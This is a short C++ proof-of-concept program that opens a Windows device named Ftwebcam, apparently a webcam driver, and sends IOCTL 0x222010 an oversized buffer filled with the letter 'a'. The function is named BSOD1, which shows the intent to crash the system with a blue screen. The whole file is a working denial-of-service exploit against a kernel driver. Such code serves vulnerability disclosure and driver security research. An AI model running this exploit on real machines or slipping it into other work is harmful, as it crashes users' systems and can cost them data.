#include <iostream>
#include <Windows.h>
#include <winioctl.h>

#define SymLinkName L"\\\\.\\Ftwebcam"

HANDLE hDevice;

void BSOD1_0x222010()
{
    DWORD dwWrite;
    unsigned char data[0x1000];
    memset(data, 'a', 0x1000);
    DeviceIoControl(hDevice, 0x222010, &data, sizeof(data), &data, sizeof(data), &dwWrite, NULL);
}

int main(int argc, char* argv[])
{
    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
        system("pause");
        return 0;
    }

    BSOD1_0x222010();

    system("pause");
    return 0;
}
